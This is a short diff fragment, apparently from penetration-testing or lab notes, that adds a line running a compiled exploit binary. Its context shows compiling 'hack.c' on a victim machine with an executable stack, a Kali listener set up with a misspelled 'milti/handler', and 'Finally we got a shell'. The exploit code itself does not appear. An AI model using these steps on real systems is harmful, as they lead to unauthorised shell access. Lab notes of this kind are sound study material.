@@ -71,6 +71,7 @@ Kali -> use milti/handler
 # compile code on victim
 gcc -o hack.out hack.c -z execstack
 
+./hack.out
 Finally we got a shell
 
 
